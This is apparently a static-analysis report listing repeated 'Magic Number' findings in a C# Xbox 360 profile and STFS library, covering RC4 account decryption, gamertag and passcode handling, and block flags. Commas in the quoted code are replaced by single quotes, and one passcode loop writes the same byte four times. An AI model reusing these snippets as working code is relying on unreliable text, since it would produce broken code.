Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: for (int i = 0; i < 2; i++) {  	switch (Data.GetType ().ToString ().ToLower ()) {  	case "system.single":  		{  			if (i == 0)  				xType = SettingType.Float;  			else {  				xIO.Write ((float)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.double":  		{  			if (i == 0)  				xType = SettingType.Double;  			else  				xIO.Write ((double)Data);  		}  		break;  	case "system.int32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((int)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.uint32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((uint)Data);  				xIO.Write ((uint)0);  			}  		}  		break;  	case "system.int64":  		{  			if (i == 0)  				xType = SettingType.Int64;  			else  				xIO.Write ((long)Data);  		}  		break;  	case "system.datetime":  		{  			if (i == 0)  				xType = SettingType.DateTime;  			else  				xIO.Write (((DateTime)Data).ToFileTime ());  		}  		break;  	case "system.byte[]":  		{  			if (i == 0) {  				xType = SettingType.Binary;  				byte[] xIn = (byte[])Data;  				xSize += xIn.Length;  			}  			else {  				byte[] xIn = (byte[])Data;  				xIO.Write (xIn.Length);  				xIO.Write (new byte[4]);  				xIO.Write (xIn);  			}  		}  		break;  	case "system.string":  		{  			if (i == 0) {  				xType = SettingType.Unicode;  				string xIn = (string)Data;  				xSize += ((xIn.Length + 1) * 2);  			}  			else {  				string xIn = (string)Data;  				xIO.Write ((xIn.Length + 1) * 2);  				xIO.Write (new byte[4]);  				xIO.Write (xIn' StringForm.Unicode);  				xIO.Write ((short)0);  			}  		}  		break;  	default:  		return (xActive = false);  	}  	if (i == 0) {  		if (xType == SettingType.Null)  			return false;  		pos = AllocateData (xSize);  		if (pos == -1)  			return false;  		else if (idx != -1) {  			xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  			PatchFree ();  			xUserSettings.RemoveAt (idx);  		}  		xIO.Position = pos + HeaderSize;  		xIO.Write ((uint)ID);  		xIO.Write (new byte[4]);  		xIO.Write ((byte)xType);  		xIO.Write (new byte[7]);  	}  	else  		xIO.Flush ();  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: for (int i = 0; i < 2; i++) {  	switch (Data.GetType ().ToString ().ToLower ()) {  	case "system.single":  		{  			if (i == 0)  				xType = SettingType.Float;  			else {  				xIO.Write ((float)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.double":  		{  			if (i == 0)  				xType = SettingType.Double;  			else  				xIO.Write ((double)Data);  		}  		break;  	case "system.int32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((int)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.uint32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((uint)Data);  				xIO.Write ((uint)0);  			}  		}  		break;  	case "system.int64":  		{  			if (i == 0)  				xType = SettingType.Int64;  			else  				xIO.Write ((long)Data);  		}  		break;  	case "system.datetime":  		{  			if (i == 0)  				xType = SettingType.DateTime;  			else  				xIO.Write (((DateTime)Data).ToFileTime ());  		}  		break;  	case "system.byte[]":  		{  			if (i == 0) {  				xType = SettingType.Binary;  				byte[] xIn = (byte[])Data;  				xSize += xIn.Length;  			}  			else {  				byte[] xIn = (byte[])Data;  				xIO.Write (xIn.Length);  				xIO.Write (new byte[4]);  				xIO.Write (xIn);  			}  		}  		break;  	case "system.string":  		{  			if (i == 0) {  				xType = SettingType.Unicode;  				string xIn = (string)Data;  				xSize += ((xIn.Length + 1) * 2);  			}  			else {  				string xIn = (string)Data;  				xIO.Write ((xIn.Length + 1) * 2);  				xIO.Write (new byte[4]);  				xIO.Write (xIn' StringForm.Unicode);  				xIO.Write ((short)0);  			}  		}  		break;  	default:  		return (xActive = false);  	}  	if (i == 0) {  		if (xType == SettingType.Null)  			return false;  		pos = AllocateData (xSize);  		if (pos == -1)  			return false;  		else if (idx != -1) {  			xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  			PatchFree ();  			xUserSettings.RemoveAt (idx);  		}  		xIO.Position = pos + HeaderSize;  		xIO.Write ((uint)ID);  		xIO.Write (new byte[4]);  		xIO.Write ((byte)xType);  		xIO.Write (new byte[7]);  	}  	else  		xIO.Flush ();  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: for (int i = 0; i < 2; i++) {  	switch (Data.GetType ().ToString ().ToLower ()) {  	case "system.single":  		{  			if (i == 0)  				xType = SettingType.Float;  			else {  				xIO.Write ((float)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.double":  		{  			if (i == 0)  				xType = SettingType.Double;  			else  				xIO.Write ((double)Data);  		}  		break;  	case "system.int32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((int)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.uint32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((uint)Data);  				xIO.Write ((uint)0);  			}  		}  		break;  	case "system.int64":  		{  			if (i == 0)  				xType = SettingType.Int64;  			else  				xIO.Write ((long)Data);  		}  		break;  	case "system.datetime":  		{  			if (i == 0)  				xType = SettingType.DateTime;  			else  				xIO.Write (((DateTime)Data).ToFileTime ());  		}  		break;  	case "system.byte[]":  		{  			if (i == 0) {  				xType = SettingType.Binary;  				byte[] xIn = (byte[])Data;  				xSize += xIn.Length;  			}  			else {  				byte[] xIn = (byte[])Data;  				xIO.Write (xIn.Length);  				xIO.Write (new byte[4]);  				xIO.Write (xIn);  			}  		}  		break;  	case "system.string":  		{  			if (i == 0) {  				xType = SettingType.Unicode;  				string xIn = (string)Data;  				xSize += ((xIn.Length + 1) * 2);  			}  			else {  				string xIn = (string)Data;  				xIO.Write ((xIn.Length + 1) * 2);  				xIO.Write (new byte[4]);  				xIO.Write (xIn' StringForm.Unicode);  				xIO.Write ((short)0);  			}  		}  		break;  	default:  		return (xActive = false);  	}  	if (i == 0) {  		if (xType == SettingType.Null)  			return false;  		pos = AllocateData (xSize);  		if (pos == -1)  			return false;  		else if (idx != -1) {  			xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  			PatchFree ();  			xUserSettings.RemoveAt (idx);  		}  		xIO.Position = pos + HeaderSize;  		xIO.Write ((uint)ID);  		xIO.Write (new byte[4]);  		xIO.Write ((byte)xType);  		xIO.Write (new byte[7]);  	}  	else  		xIO.Flush ();  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: switch (Data.GetType ().ToString ().ToLower ()) {  case "system.single":  	{  		if (i == 0)  			xType = SettingType.Float;  		else {  			xIO.Write ((float)Data);  			xIO.Write ((int)0);  		}  	}  	break;  case "system.double":  	{  		if (i == 0)  			xType = SettingType.Double;  		else  			xIO.Write ((double)Data);  	}  	break;  case "system.int32":  	{  		if (i == 0)  			xType = SettingType.UInt32;  		else {  			xIO.Write ((int)Data);  			xIO.Write ((int)0);  		}  	}  	break;  case "system.uint32":  	{  		if (i == 0)  			xType = SettingType.UInt32;  		else {  			xIO.Write ((uint)Data);  			xIO.Write ((uint)0);  		}  	}  	break;  case "system.int64":  	{  		if (i == 0)  			xType = SettingType.Int64;  		else  			xIO.Write ((long)Data);  	}  	break;  case "system.datetime":  	{  		if (i == 0)  			xType = SettingType.DateTime;  		else  			xIO.Write (((DateTime)Data).ToFileTime ());  	}  	break;  case "system.byte[]":  	{  		if (i == 0) {  			xType = SettingType.Binary;  			byte[] xIn = (byte[])Data;  			xSize += xIn.Length;  		}  		else {  			byte[] xIn = (byte[])Data;  			xIO.Write (xIn.Length);  			xIO.Write (new byte[4]);  			xIO.Write (xIn);  		}  	}  	break;  case "system.string":  	{  		if (i == 0) {  			xType = SettingType.Unicode;  			string xIn = (string)Data;  			xSize += ((xIn.Length + 1) * 2);  		}  		else {  			string xIn = (string)Data;  			xIO.Write ((xIn.Length + 1) * 2);  			xIO.Write (new byte[4]);  			xIO.Write (xIn' StringForm.Unicode);  			xIO.Write ((short)0);  		}  	}  	break;  default:  	return (xActive = false);  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: switch (Data.GetType ().ToString ().ToLower ()) {  case "system.single":  	{  		if (i == 0)  			xType = SettingType.Float;  		else {  			xIO.Write ((float)Data);  			xIO.Write ((int)0);  		}  	}  	break;  case "system.double":  	{  		if (i == 0)  			xType = SettingType.Double;  		else  			xIO.Write ((double)Data);  	}  	break;  case "system.int32":  	{  		if (i == 0)  			xType = SettingType.UInt32;  		else {  			xIO.Write ((int)Data);  			xIO.Write ((int)0);  		}  	}  	break;  case "system.uint32":  	{  		if (i == 0)  			xType = SettingType.UInt32;  		else {  			xIO.Write ((uint)Data);  			xIO.Write ((uint)0);  		}  	}  	break;  case "system.int64":  	{  		if (i == 0)  			xType = SettingType.Int64;  		else  			xIO.Write ((long)Data);  	}  	break;  case "system.datetime":  	{  		if (i == 0)  			xType = SettingType.DateTime;  		else  			xIO.Write (((DateTime)Data).ToFileTime ());  	}  	break;  case "system.byte[]":  	{  		if (i == 0) {  			xType = SettingType.Binary;  			byte[] xIn = (byte[])Data;  			xSize += xIn.Length;  		}  		else {  			byte[] xIn = (byte[])Data;  			xIO.Write (xIn.Length);  			xIO.Write (new byte[4]);  			xIO.Write (xIn);  		}  	}  	break;  case "system.string":  	{  		if (i == 0) {  			xType = SettingType.Unicode;  			string xIn = (string)Data;  			xSize += ((xIn.Length + 1) * 2);  		}  		else {  			string xIn = (string)Data;  			xIO.Write ((xIn.Length + 1) * 2);  			xIO.Write (new byte[4]);  			xIO.Write (xIn' StringForm.Unicode);  			xIO.Write ((short)0);  		}  	}  	break;  default:  	return (xActive = false);  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: switch (Data.GetType ().ToString ().ToLower ()) {  case "system.single":  	{  		if (i == 0)  			xType = SettingType.Float;  		else {  			xIO.Write ((float)Data);  			xIO.Write ((int)0);  		}  	}  	break;  case "system.double":  	{  		if (i == 0)  			xType = SettingType.Double;  		else  			xIO.Write ((double)Data);  	}  	break;  case "system.int32":  	{  		if (i == 0)  			xType = SettingType.UInt32;  		else {  			xIO.Write ((int)Data);  			xIO.Write ((int)0);  		}  	}  	break;  case "system.uint32":  	{  		if (i == 0)  			xType = SettingType.UInt32;  		else {  			xIO.Write ((uint)Data);  			xIO.Write ((uint)0);  		}  	}  	break;  case "system.int64":  	{  		if (i == 0)  			xType = SettingType.Int64;  		else  			xIO.Write ((long)Data);  	}  	break;  case "system.datetime":  	{  		if (i == 0)  			xType = SettingType.DateTime;  		else  			xIO.Write (((DateTime)Data).ToFileTime ());  	}  	break;  case "system.byte[]":  	{  		if (i == 0) {  			xType = SettingType.Binary;  			byte[] xIn = (byte[])Data;  			xSize += xIn.Length;  		}  		else {  			byte[] xIn = (byte[])Data;  			xIO.Write (xIn.Length);  			xIO.Write (new byte[4]);  			xIO.Write (xIn);  		}  	}  	break;  case "system.string":  	{  		if (i == 0) {  			xType = SettingType.Unicode;  			string xIn = (string)Data;  			xSize += ((xIn.Length + 1) * 2);  		}  		else {  			string xIn = (string)Data;  			xIO.Write ((xIn.Length + 1) * 2);  			xIO.Write (new byte[4]);  			xIO.Write (xIn' StringForm.Unicode);  			xIO.Write ((short)0);  		}  	}  	break;  default:  	return (xActive = false);  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: switch (Data.GetType ().ToString ().ToLower ()) {  case "system.single":  	{  		if (i == 0)  			xType = SettingType.Float;  		else {  			xIO.Write ((float)Data);  			xIO.Write ((int)0);  		}  	}  	break;  case "system.double":  	{  		if (i == 0)  			xType = SettingType.Double;  		else  			xIO.Write ((double)Data);  	}  	break;  case "system.int32":  	{  		if (i == 0)  			xType = SettingType.UInt32;  		else {  			xIO.Write ((int)Data);  			xIO.Write ((int)0);  		}  	}  	break;  case "system.uint32":  	{  		if (i == 0)  			xType = SettingType.UInt32;  		else {  			xIO.Write ((uint)Data);  			xIO.Write ((uint)0);  		}  	}  	break;  case "system.int64":  	{  		if (i == 0)  			xType = SettingType.Int64;  		else  			xIO.Write ((long)Data);  	}  	break;  case "system.datetime":  	{  		if (i == 0)  			xType = SettingType.DateTime;  		else  			xIO.Write (((DateTime)Data).ToFileTime ());  	}  	break;  case "system.byte[]":  	{  		if (i == 0) {  			xType = SettingType.Binary;  			byte[] xIn = (byte[])Data;  			xSize += xIn.Length;  		}  		else {  			byte[] xIn = (byte[])Data;  			xIO.Write (xIn.Length);  			xIO.Write (new byte[4]);  			xIO.Write (xIn);  		}  	}  	break;  case "system.string":  	{  		if (i == 0) {  			xType = SettingType.Unicode;  			string xIn = (string)Data;  			xSize += ((xIn.Length + 1) * 2);  		}  		else {  			string xIn = (string)Data;  			xIO.Write ((xIn.Length + 1) * 2);  			xIO.Write (new byte[4]);  			xIO.Write (xIn' StringForm.Unicode);  			xIO.Write ((short)0);  		}  	}  	break;  default:  	return (xActive = false);  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: if (i == 0) {  	xType = SettingType.Binary;  	byte[] xIn = (byte[])Data;  	xSize += xIn.Length;  }  else {  	byte[] xIn = (byte[])Data;  	xIO.Write (xIn.Length);  	xIO.Write (new byte[4]);  	xIO.Write (xIn);  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: xIO.Write (new byte[4]);  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: if (i == 0) {  	xType = SettingType.Unicode;  	string xIn = (string)Data;  	xSize += ((xIn.Length + 1) * 2);  }  else {  	string xIn = (string)Data;  	xIO.Write ((xIn.Length + 1) * 2);  	xIO.Write (new byte[4]);  	xIO.Write (xIn' StringForm.Unicode);  	xIO.Write ((short)0);  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: if (i == 0) {  	xType = SettingType.Unicode;  	string xIn = (string)Data;  	xSize += ((xIn.Length + 1) * 2);  }  else {  	string xIn = (string)Data;  	xIO.Write ((xIn.Length + 1) * 2);  	xIO.Write (new byte[4]);  	xIO.Write (xIn' StringForm.Unicode);  	xIO.Write ((short)0);  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: if (i == 0) {  	xType = SettingType.Unicode;  	string xIn = (string)Data;  	xSize += ((xIn.Length + 1) * 2);  }  else {  	string xIn = (string)Data;  	xIO.Write ((xIn.Length + 1) * 2);  	xIO.Write (new byte[4]);  	xIO.Write (xIn' StringForm.Unicode);  	xIO.Write ((short)0);  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: xSize += ((xIn.Length + 1) * 2);  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: xIO.Write ((xIn.Length + 1) * 2);  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: xIO.Write (new byte[4]);  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: if (i == 0) {  	if (xType == SettingType.Null)  		return false;  	pos = AllocateData (xSize);  	if (pos == -1)  		return false;  	else if (idx != -1) {  		xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  		PatchFree ();  		xUserSettings.RemoveAt (idx);  	}  	xIO.Position = pos + HeaderSize;  	xIO.Write ((uint)ID);  	xIO.Write (new byte[4]);  	xIO.Write ((byte)xType);  	xIO.Write (new byte[7]);  }  else  	xIO.Flush ();  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: if (i == 0) {  	if (xType == SettingType.Null)  		return false;  	pos = AllocateData (xSize);  	if (pos == -1)  		return false;  	else if (idx != -1) {  		xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  		PatchFree ();  		xUserSettings.RemoveAt (idx);  	}  	xIO.Position = pos + HeaderSize;  	xIO.Write ((uint)ID);  	xIO.Write (new byte[4]);  	xIO.Write ((byte)xType);  	xIO.Write (new byte[7]);  }  else  	xIO.Flush ();  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: xIO.Write (new byte[4]);  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: xIO.Write (new byte[7]);  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,AddString,The following statement contains a magic number: try {  	int idx = -1;  	for (int i = 0; i < xStrings.Count; i++) {  		if (xStrings [i].ID != ID)  			continue;  		if (!AutomaticOverwrite)  			return (xActive = false);  		idx = i;  		break;  	}  	int xoff = AllocateData (xIn.Length * 2);  	if (xoff == -1)  		return (xActive = false);  	else if (idx != -1) {  		new FreeSpaceEntry (this' xStrings [idx].xOffset' xStrings [idx].Size);  		PatchFree ();  		xStrings.RemoveAt (idx);  	}  	foreach (RecordEntry x in xIndexRecords) {  		if (x.NS == NameSpace.Setting) {  			for (int i = 0; i < x.xpairs.Count; i++) {  				if (x.xpairs [i].ID == ID)  					x.xpairs.RemoveAt (i--);  			}  			x.xUpdate ();  		}  	}  	xIO.Position = xoff + HeaderSize;  	xIO.Write (xIn' StringForm.Unicode);  	StringEntry y = new StringEntry (new XDBFEntry (NameSpace.String' ID' xoff' xIn.Length * 2' this));  	y.LoadString ();  	xStrings.Add (y);  	return (UpdateHeader () & !(xActive = false));  }  catch {  	return (xActive = false);  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,AddString,The following statement contains a magic number: try {  	int idx = -1;  	for (int i = 0; i < xStrings.Count; i++) {  		if (xStrings [i].ID != ID)  			continue;  		if (!AutomaticOverwrite)  			return (xActive = false);  		idx = i;  		break;  	}  	int xoff = AllocateData (xIn.Length * 2);  	if (xoff == -1)  		return (xActive = false);  	else if (idx != -1) {  		new FreeSpaceEntry (this' xStrings [idx].xOffset' xStrings [idx].Size);  		PatchFree ();  		xStrings.RemoveAt (idx);  	}  	foreach (RecordEntry x in xIndexRecords) {  		if (x.NS == NameSpace.Setting) {  			for (int i = 0; i < x.xpairs.Count; i++) {  				if (x.xpairs [i].ID == ID)  					x.xpairs.RemoveAt (i--);  			}  			x.xUpdate ();  		}  	}  	xIO.Position = xoff + HeaderSize;  	xIO.Write (xIn' StringForm.Unicode);  	StringEntry y = new StringEntry (new XDBFEntry (NameSpace.String' ID' xoff' xIn.Length * 2' this));  	y.LoadString ();  	xStrings.Add (y);  	return (UpdateHeader () & !(xActive = false));  }  catch {  	return (xActive = false);  }  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,UserAccount,The following statement contains a magic number: if (xAcc.Length != 404 || !Enum.IsDefined (typeof(AccountType)' xType))  	return;  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,UserAccount,The following statement contains a magic number: if (xDecrypt (out xfill)) {  	if (CreateBackup) {  		xBackup = new DJsIO (true);  		xBackup.Position = 0;  		xBackup.Write (IO.ReadStream ());  	}  	xfill.Position = 0;  	if (((xfill.ReadByte () >> 5) & 1) == 1) {  		xIsLive = true;  		xfill.Position = 0x28;  		xXUID = xfill.ReadUInt64 ();  	}  	xSuccess = true;  }  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,UserAccount,The following statement contains a magic number: if (((xfill.ReadByte () >> 5) & 1) == 1) {  	xIsLive = true;  	xfill.Position = 0x28;  	xXUID = xfill.ReadUInt64 ();  }  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,xDecrypt,The following statement contains a magic number: try {  	IO.Position = 0;  	byte[] xHeaderKey = IO.ReadBytes (0x10);  	xRC4 = new RC4 (xComputeRC4Key (xHeaderKey));  	byte[] xData = IO.ReadBytes (0x184);  	byte[] xPayload;  	byte[] xConfounder;  	if (!xRC4.KerberosDecrypt (xData' out xConfounder' 8' out xPayload))  		return false;  	bool xsuccess = xComputeHeaderKey (xConfounder' xPayload).HexString () == xHeaderKey.HexString ();  	if (xsuccess)  		PayLoad = new DJsIO (xPayload' true);  	return xsuccess;  }  catch {  	return false;  }  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,xDecrypt,The following statement contains a magic number: if (!xRC4.KerberosDecrypt (xData' out xConfounder' 8' out xPayload))  	return false;  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,xEncrypt,The following statement contains a magic number: try {  	if (!xSuccess)  		return false;  	if (xIsLive) {  		byte[] xService = (ThisType == AccountType.Stock ? new byte[] {  			0x50'  			0x52'  			0x4F'  			0x44  		} : // PROD  		new byte[] {  			0x50'  			0x41'  			0x53'  			0x54  		});  		// PART  		xNewPayload.Position = 0x34;  		xNewPayload.Write (xService);  		xNewPayload.Flush ();  	}  	List<byte> xReturn = new List<byte> ();  	byte[] xConfounder = xRC4.NewConfounder (8);  	byte[] NewPay = xNewPayload.ReadStream ();  	xNewPayload.Dispose ();  	byte[] xHeaderKey = xComputeHeaderKey (xConfounder' NewPay);  	xRC4.KeyBinary = xComputeRC4Key (xHeaderKey);  	xReturn.AddRange (xHeaderKey);  	xReturn.AddRange (xRC4.KerberosEncrypt (ref xConfounder' ref NewPay));  	IO.Position = 0;  	IO.Write (xReturn.ToArray ());  	IO.Flush ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,GetGamertag,The following statement contains a magic number: xTemp.Position = 8;  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,GetGamertag,The following statement contains a magic number: return xTemp.ReadString (StringForm.Unicode' 15);  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,SaveGamertag,The following statement contains a magic number: xTemp.Position = 8;  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,SaveGamertag,The following statement contains a magic number: xTemp.Write (xNewTag' StringForm.Unicode' 15' PadLocale.Right' PadType.Null);  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,GetPassCode,The following statement contains a magic number: if (((xTemp.ReadByte () >> 4) & 1) == 1) {  	List<PassCode> xReturn = new List<PassCode> ();  	for (int i = 0; i < 4; i++)  		xReturn.Add ((PassCode)xTemp.ReadByte ());  	if (!xReturn.Contains (PassCode.Null))  		return xReturn.ToArray ();  }  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,GetPassCode,The following statement contains a magic number: if (((xTemp.ReadByte () >> 4) & 1) == 1) {  	List<PassCode> xReturn = new List<PassCode> ();  	for (int i = 0; i < 4; i++)  		xReturn.Add ((PassCode)xTemp.ReadByte ());  	if (!xReturn.Contains (PassCode.Null))  		return xReturn.ToArray ();  }  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,GetPassCode,The following statement contains a magic number: for (int i = 0; i < 4; i++)  	xReturn.Add ((PassCode)xTemp.ReadByte ());  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,GetPassCode,The following statement contains a magic number: xTemp.Write ((byte)((xIsLive ? 1 : 0) << 5 | 0 << 4));  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,GetPassCode,The following statement contains a magic number: xTemp.Write ((byte)((xIsLive ? 1 : 0) << 5 | 0 << 4));  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,GetPassCode,The following statement contains a magic number: xTemp.Write (new byte[4]);  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,SetPassCode,The following statement contains a magic number: if (xPass == null || xPass.Length != 4 || xPass.Contains (PassCode.Null))  	return false;  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,SetPassCode,The following statement contains a magic number: for (int i = 0; i < 4; i++)  	xTemp.Write ((byte)xPass [0]);  
Magic Number,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,ForceIntoHDDAccount,The following statement contains a magic number: xTemp.Write (new byte[9]);  
Magic Number,X360.Profile,ProfileTools,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,GPDNameToID,The following statement contains a magic number: try {  	GPDName = GPDName.Replace ("\0"' "");  	GPDName = GPDName.ToLower ();  	GPDName = GPDName.Replace (".gpd"' "");  	return Convert.ToUInt32 (GPDName' 16);  }  catch {  	return 0;  }  
Magic Number,X360.Profile,ProfileTools,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,GPDNameToID,The following statement contains a magic number: return Convert.ToUInt32 (GPDName' 16);  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,BlockRecord,The following statement contains a magic number: Flags = (uint)((uint)xStatus << 30 | (xNext & 0xFFFFFF));  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: try {  	switch (AllocationFlag) {  	case HashFlag.Unallocated:  		Flags = (uint)((1 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedFree:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseOld:  		Flags = (uint)((3 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseCurrent:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	}  	return false;  }  catch {  	return false;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: try {  	switch (AllocationFlag) {  	case HashFlag.Unallocated:  		Flags = (uint)((1 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedFree:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseOld:  		Flags = (uint)((3 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseCurrent:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	}  	return false;  }  catch {  	return false;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: try {  	switch (AllocationFlag) {  	case HashFlag.Unallocated:  		Flags = (uint)((1 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedFree:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseOld:  		Flags = (uint)((3 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseCurrent:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	}  	return false;  }  catch {  	return false;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: try {  	switch (AllocationFlag) {  	case HashFlag.Unallocated:  		Flags = (uint)((1 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedFree:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseOld:  		Flags = (uint)((3 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseCurrent:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	}  	return false;  }  catch {  	return false;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: try {  	switch (AllocationFlag) {  	case HashFlag.Unallocated:  		Flags = (uint)((1 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedFree:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseOld:  		Flags = (uint)((3 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseCurrent:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	}  	return false;  }  catch {  	return false;  }  
